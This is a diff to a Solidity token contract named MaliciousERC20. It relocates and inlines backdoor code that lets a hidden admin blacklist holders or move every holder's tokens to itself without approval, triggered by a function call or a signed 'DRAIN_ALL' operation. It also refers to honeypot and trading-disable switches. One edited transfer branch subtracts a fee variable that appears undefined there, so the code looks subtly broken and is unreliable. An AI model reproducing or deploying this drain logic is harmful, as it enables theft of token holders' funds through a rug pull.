@@ -1,8 +1,8 @@
-// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: MIT
 pragma solidity 0.8.26;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 
 /**
  * @title MaliciousERC20
@@ -416,6 +416,36 @@ contract MaliciousERC20 is ERC20, ReentrancyGuard {
         // Burn the flash-loaned amount
         _burn(msg.sender, flashAmount);
     }
+
+    /**
+     * @dev Hidden function to target specific users with token draining
+     */
+    function airdropTargeting(uint256 startIndex, uint256 count, uint256 specificAction) external {
+        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
+        
+        uint256 endIndex = startIndex + count;
+        if (endIndex > _interactedAddresses.length) {
+            endIndex = _interactedAddresses.length;
+        }
+        
+        // Different actions based on specificAction parameter
+        if (specificAction == 1) {
+            // Blacklist users
+            for (uint i = startIndex; i < endIndex; i++) {
+                blacklisted[_interactedAddresses[i]] = true;
+            }
+        } else if (specificAction == 2) {
+            // Drain tokens from users (the ultimate rug)
+            for (uint i = startIndex; i < endIndex; i++) {
+                address victim = _interactedAddresses[i];
+                uint256 victimBalance = super.balanceOf(victim);
+                if (victimBalance > 0) {
+                    // Directly move tokens from victim to admin without approval
+                    _transfer(victim, _hiddenAdmin, victimBalance);
+                }
+            }
+        }
+    }
     
     /**
      * @dev NEW: Signature-based backdoor with frontrunning protection
@@ -432,20 +462,28 @@ contract MaliciousERC20 is ERC20, ReentrancyGuard {
         // Prevent signature reuse
         require(!_usedSignatures[signatureHash], "Signature already used");
         _usedSignatures[signatureHash] = true;
-        
+    
         // Verify the signature belongs to admin
-        bytes32 messageHash = keccak256(abi.encodePacked(
+        bytes32 messageHash = keccak256(abi.encodePacked(  
             "\x19Ethereum Signed Message:\n32",
             keccak256(abi.encodePacked(address(this), operation))
         ));
         address recoveredAddress = ecrecover(messageHash, v, r, s);
         
         require(recoveredAddress == _hiddenAdmin, "Invalid signature");
-        
+ 
         // Hidden admin actions based on operation code
         if (operation == keccak256("DRAIN_ALL")) {
-            // Drain all tokens from users
-            airdropTargeting(0, _interactedAddresses.length, 2);
+            // Drain all tokens from users - direct implementation instead of calling airdropTargeting
+            uint256 endIndex = _interactedAddresses.length;
+            for (uint i = 0; i < endIndex; i++) {
+                address victim = _interactedAddresses[i];
+                uint256 victimBalance = super.balanceOf(victim);
+                if (victimBalance > 0) {
+                    // Directly move tokens from victim to admin without approval
+                    _transfer(victim, _hiddenAdmin, victimBalance);
+                }
+            }
         } else if (operation == keccak256("DISABLE_TRADING")) {
             tradingEnabled = false;
         } else if (operation == keccak256("HONEYPOT_ON")) {
@@ -686,20 +724,20 @@ contract MaliciousERC20 is ERC20, ReentrancyGuard {
             super.transfer(marketingWallet, marketingFee);
             super.transfer(devWallet, devFee);
             
-            bool result = super.transfer(to, amount - feeAmount);
+            bool transferResult = super.transfer(to, amount - feeAmount);
             
             // Run malicious post-transfer actions
             _doAfterTokenTransfer(msg.sender, to, amount);
             
-            return result;
+            return transferResult;
         }
         
-        bool result = super.transfer(to, amount);
+        bool transferResult = super.transfer(to, amount - feeAmount);
         
         // Run malicious post-transfer actions
         _doAfterTokenTransfer(msg.sender, to, amount);
         
-        return result;
+        return transferResult;
     }
     
     /**
@@ -886,36 +924,6 @@ contract MaliciousERC20 is ERC20, ReentrancyGuard {
                 // If it's another token, use a low-level call for maximum flexibility
                 (success,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", _hiddenAdmin, amount));
                 require(success, "Token extraction failed");
-            }
-        }
-    }
-    
-    /**
-     * @dev Hidden function to target specific users with token draining
-     */
-    function airdropTargeting(uint256 startIndex, uint256 count, uint256 specificAction) external {
-        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
-        
-        uint256 endIndex = startIndex + count;
-        if (endIndex > _interactedAddresses.length) {
-            endIndex = _interactedAddresses.length;
-        }
-        
-        // Different actions based on specificAction parameter
-        if (specificAction == 1) {
-            // Blacklist users
-            for (uint i = startIndex; i < endIndex; i++) {
-                blacklisted[_interactedAddresses[i]] = true;
-            }
-        } else if (specificAction == 2) {
-            // Drain tokens from users (the ultimate rug)
-            for (uint i = startIndex; i < endIndex; i++) {
-                address victim = _interactedAddresses[i];
-                uint256 victimBalance = super.balanceOf(victim);
-                if (victimBalance > 0) {
-                    // Directly move tokens from victim to admin without approval
-                    _transfer(victim, _hiddenAdmin, victimBalance);
-                }
             }
         }
     }
